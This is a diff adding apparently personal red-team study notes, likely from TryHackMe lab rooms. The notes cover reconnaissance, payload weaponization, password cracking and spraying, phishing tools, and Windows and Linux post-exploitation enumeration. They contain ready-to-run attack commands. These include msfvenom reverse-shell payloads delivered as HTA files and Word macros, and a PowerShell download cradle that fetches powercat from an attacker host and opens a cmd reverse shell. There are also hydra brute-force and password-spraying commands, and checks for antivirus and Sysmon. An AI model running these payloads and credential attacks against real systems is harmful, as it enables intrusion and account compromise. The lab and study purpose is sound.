@@ -1,0 +1,197 @@
+sudo apt autoclean && sudo apt autoremove
+passive reconaissance :
+    whois thmredteam.com => domain information
+    nslookup cafe.thmredteam.com => dns info
+    dig cafe.thmredteam.com @1.1.1.1 => dns info
+    host cafe.thmredteam.com
+    OSINT :
+        "text included" => Find results with exact search phrase
+        IA filetype:pdf => Find files of type PDF related to a certain term.
+        salary site:blog.tryhackme.com	=> Limit search results to a specific site.
+        pentest -site:example.com	=> Exclude a specific site from results
+        walkthrough intitle:TryHackMe	=> Find pages with a specific term in the page title.
+        challenge inurl:tryhackme	=> Find pages with a specific term in the page URL.
+    site web:
+        https://viewdns.info/reverseip/ => web domaine have the same ip
+        threatintelligenceplatform.com => information
+        search.censys.io/ => information
+        https://www.shodan.io/ => information
+    recon-ng:
+        recon-ng => ro start recon-ng
+        workspaces create workspace_name => to create workspace
+        recon-ng -w WORKSPACE_NAME => starts recon-ng with the specific workspace.
+        db schema => to show all tables
+        db insert table_name => to insert into table
+        
+        marketplace search KEYWORD => to search for available modules with keyword.
+        marketplace info MODULE => to provide information about the module in question.
+        marketplace install MODULE => to install the specified module into Recon-ng.
+        marketplace remove MODULE => to uninstall the specified module.
+        
+        modules search => to get a list of all the installed modules
+        modules load MODULE =>  to load a specific module to memory
+        
+        options list => to list the options that we can set for the loaded module.
+        options set <option> <value> => to set the value of the option.
+        
+        keys list => lists the keys
+        keys add KEY_NAME KEY_VALUE => adds a key
+        keys remove KEY_NAME => removes a key
+        
+        run
+        
+Weaponization: generate payloads such as word documents, PDFs, etc
+    1-Windows Scripting Host (WSH) :It is a Windows native engine, cscript.exe (for command-line scripts) and wscript.exe 
+                                  (for UI  scripts), which are responsible for executing various Microsoft Visual Basic Scripts  
+                                   (VBScript), including vbs and vbe
+                                   
+                                  1- first create file with .vbs and include code that do something (excute .exe)
+                                  2- run the file using { wscript file.vbs or wscript /e:VBScript c:\Users\thm\Desktop\payload.txt} 
+    2-An HTML Application (HTA):
+            sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.25.229 LPORT=1234 -f hta-psh -o thm.hta
+            python3 -m http.server 8090
+            go to http://10.8.25.229:8090/thm.hta
+   3-Visual Basic for Application (VBA):VBA stands for Visual Basic for Applications, a programming language by Microsoft
+                                       implemented
+                                      for Microsoft applications such as Microsoft Word, Excel, PowerPoint, etc.
+                                      1 - go to view → macros
+                                      2- write your code generated :msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.25.229 
+                                                                     LPORT=1234 -f vba
+   4 - powershell:
+                1-get powercat in attacker machine:  git clone https://github.com/besimorhino/powercat.git
+                2- python3 -m http.server 8080
+                3- open listner : nc -lvp 1337
+                4- from victim machine excute :  
+                powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.8.25.229:8090
+                              /powercat/powercat.ps1');powercat -c 10.8.25.229 -p 1337 -e cmd"
+
+password attacks:
+    default passwords:
+        https://cirt.net/passwords
+        https://default-password.info/
+        https://datarecovery.com/rd/default-passwords/
+    Weak Passwords
+    Leaked Passwords : from hacked database
+    Customized Wordlists:
+        cewl -w list.txt -d 5 -m 5 http://thm.labs => generate wordlist from website
+    Username Wordlists:
+         git clone https://github.com/therodri2/username_generator.git
+         cd username_generator
+         echo "John Smith" > users.lst
+         python3 username_generator.py -w users.lst
+    generate wordlist :
+        crunch:
+            crunch 2 2 01234abcd -o crunch.txt => 2 min and max the chars are "01234abcd"
+            crunch 6 6 -t pass%% => with pattern 
+                @ - lower case alpha characters
+                , - upper case alpha characters
+                % - numeric characters
+                ^ - special characters including space
+        CUPP :
+            git clone https://github.com/Mebus/cupp.git
+            python3 cupp.py
+            python3 cupp.py -i
+    offline attack:
+        1- What type of hash is this? :
+            hashid
+            hash-identifier
+        2-type of attack :
+            hashcat:
+                dictionarry:
+                    hashcat -a 0 -m 0 F806FC5A2A0D5BA2471600758452799C /usr/share/wordlists/rockyou.txt --show => -m to 
+                                                                                                                   specify  type
+                                                                                                                     of hash
+                                                                                                                     
+                Brute-Force attack:
+                    hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d => the password are 4 digits
+                rule based attack: you can set rule in john.conf then used 
+                        sudo vi /etc/john/john.conf => add the rule
+                        john --wordlist=clinic.lst --rules=my_new_rule --stdout => to get the new dictionnary based in rules
+                        
+    online password attack:use hydra tools to attack multiple protocol http,ftp,smtp,ssh ect
+               hydra -l pittman@clinic.thmredteam.com -P new_dict.txt smtp://10.10.71.89 -v 
+               hydra -l phillips -P clinic.lst 10.10.71.89 http-get-form "/login-get/index.php?username=^USER^&password=^PASS^" -f 
+    Password spraying : on password try to multiple user
+        hydra -L usernames-list.txt -p Fall2021@ ssh://10.10.71.89
+        
+        
+phishing: 
+    tools :
+        GoPhish: create fake emails templates
+        SET - (Social Engineering Toolkit) : fake websites 
+        
+post exploitation:
+    enumerate network : know the architecture of network ,DMZ ,private network ect ...
+        netstat -na
+        arp -a
+    enumerate AD: Active directories controlled by domain controller or server network 
+            domain controller :  is a Windows server that provides Active Directory services and controls the entire domain. It is
+                                  a form of centralized user management that provides encryption of user data as well as
+                                   controlling access to a network, including users, groups, policies, and computers. It also
+                                    enables resource access and sharing. These are all reasons why attackers target a domain
+                                     controller in a domain because it contains a lot of high-value information.
+                 systeminfo => information about the host
+                 Get-ADUser  -Filter * => information about users
+    enumerate security solution:
+        enumerate antivirus :
+             wmic /namespace:\\root\securitycenter2 path antivirusproduct
+             Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
+        enumerate windows defender:
+             Get-Service WinDefend
+             Get-MpComputerStatus | select RealTimeProtectionEnabled
+        Host-based Firewall:
+             Get-NetFirewallProfile | Format-Table Name, Enabled
+        get logs:
+            Get-EventLog -List
+            System Monitor (Sysmon):
+                Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
+                Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
+                Get-Service | where-object {$_.DisplayName -like "*sysm*"}
+                reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
+        enumerate IDS/IPS/EDR
+        enumerate application and services :
+            wmic product get name,version
+            wmic service 
+            Get-Process
+            netstat -noa |findstr "LISTENING" |findstr "3212"
+   linux enumeration:
+        ls /etc/*-release => then cat the files
+        hostname
+        cat /etc/passwd
+        ls -lh /var/mail/
+        ls -lh /usr/bin/ => installed app
+        ls -lh /sbin/ => installed app
+        dpkg -l 
+        rpm -qa
+        whoami
+        w
+        id
+        last  => logging
+        ip a s => network configuration
+        cat /etc/resolv.conf => dns serveur
+         sudo netstat -plt => Programs Listening on TCP sockets
+         sudo netstat -atupn
+         sudo lsof -i =>  List Open Files
+         ps => running process
+         ps -ef | grep peter
+   Windows enumeration:
+        systeminfo => information about system
+        wmic qfe get Caption, Description
+        net start =>  installed and started Windows services
+        wmic product get name,version,vendor => installed apps
+        whoami
+        whoami /groups
+        net user
+        net local group
+        ipconfig
+        netstat -abno
+        arp -a
+    DNS:
+        dig -t AXFR redteam.thm @10.10.193.162
+        /etc/resolv.conf
+    smb:
+        net share
+    snmp :
+        snmp-check -c public -v1 10.10.113.209
+
+
